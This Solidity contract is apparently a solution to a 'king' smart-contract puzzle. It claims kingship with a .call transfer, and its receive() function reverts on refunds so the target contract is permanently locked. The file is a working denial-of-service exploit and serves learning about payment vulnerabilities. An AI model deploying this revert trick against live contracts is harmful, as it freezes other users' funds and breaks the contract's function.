// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Regicide
 * @author Richu A Kuttikattu
 * @notice Contract that solves the king puzzle.
 * The trouble wasn't the submitting instance part: knew that it was just a matter of reverting inside a receive() function
 * The trouble, however, was in becoming King in the first place.
 * All transactions were reverting when using .transfer()and .send() functions. .call() works, and I don't have much idea why!
 *
 */

contract Regicide {
    address constant kingContractAddress = 0x98D418Af538Ae5D70893E5C554AA3FAC6155a18b;

    function takeTheThrone() public payable {
        // payable(kingContractAddress).transfer(msg.value);
        // bool success = payable(kingContractAddress).send(msg.value);
        // if(!success){
        //     revert();
        // }

        (bool sent,) = kingContractAddress.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        // The Throne is Mine!!
        if (msg.sender == kingContractAddress) {
            revert();
        }
    }
}
